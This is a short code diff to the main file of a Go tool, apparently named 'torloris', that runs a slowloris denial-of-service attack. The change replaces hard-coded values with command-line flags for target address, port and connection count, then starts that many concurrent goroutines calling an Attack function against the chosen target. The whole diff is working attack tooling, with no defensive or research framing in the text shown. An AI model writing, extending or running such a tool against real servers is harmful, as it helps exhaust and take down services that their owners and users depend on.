@@ -11,8 +11,19 @@ import (
 	"github.com/tauraamui/torloris/slowloris"
 )
 
+type options struct {
+	target string
+	port string
+	connections int
+}
+
 func main() {
 
+	opts := options{}
+	
+	flag.StringVar(&opts.target, "target", "", "address of target endpoint")
+	flag.StringVar(&opts.port, "port", "80", "http port to use")
+	flag.IntVar(&opts.connections, "connections", 500, "number of concurrent connections")
 	flag.Parse()
 
 	client, err := slowloris.NewClient()
@@ -35,8 +46,8 @@ func main() {
 	//force all connections to start sending at exact same time
 	start := make(chan struct{})
 
-	for i := 0; i < 500; i++ {
-		go client.Attack(&start, fmt.Sprintf("%s:%s", flag.Args()[0], "80"))
+	for i := 0; i < opts.connections; i++ {
+		go client.Attack(&start, fmt.Sprintf("%s:%s", opts.target, opts.port))
 	}
 
 	close(start)
